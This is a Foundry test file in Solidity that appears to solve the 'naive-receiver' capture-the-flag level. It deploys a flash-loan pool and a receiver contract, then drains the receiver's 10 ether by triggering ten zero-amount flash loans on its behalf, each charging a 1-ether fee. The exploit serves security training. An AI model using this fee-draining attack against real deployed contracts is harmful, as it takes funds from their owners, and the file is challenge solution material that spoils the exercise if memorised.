// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
import "../../src/naive-receiver/FlashLoanReceiver.sol";

contract NaiveReceiverTest is Test {
    address public deployer;
    address public player;
    address public user;
    address public ETH;

    NaiveReceiverLenderPool public pool;
    FlashLoanReceiver public receiver;

    uint256 public constant ETHER_IN_POOL = 1_000 ether;
    uint256 public constant ETHER_IN_RECEIVER = 10 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        user = makeAddr("user");
        player = makeAddr("player");
        vm.deal(deployer, 1_010 ether);

        vm.startPrank(deployer);
        pool = new NaiveReceiverLenderPool();
        (bool success,) = address(pool).call{value: ETHER_IN_POOL}("");
        require(success, "failed to send ether to pool");
        ETH = pool.ETH();

        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(pool.maxFlashLoan(ETH), ETHER_IN_POOL);
        assertEq(pool.flashFee(ETH, 0), 1 ether);

        receiver = new FlashLoanReceiver(address(pool));
        (success,) = address(receiver).call{value: ETHER_IN_RECEIVER}("");

        vm.expectRevert();
        receiver.onFlashLoan(deployer, ETH, ETHER_IN_RECEIVER, 10 ether, "0x");

        assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
        vm.stopPrank();
    }

    function exploit() public {
        vm.startPrank(player);
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 0, "0x");
        }
        // emit log_named_decimal_uint("pool balance", address(pool).balance, 18);
        // emit log_named_decimal_uint("receiver balance", address(receiver).balance, 18);
        vm.stopPrank();
    }

    function test_exploit() public {
        exploit();

        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}
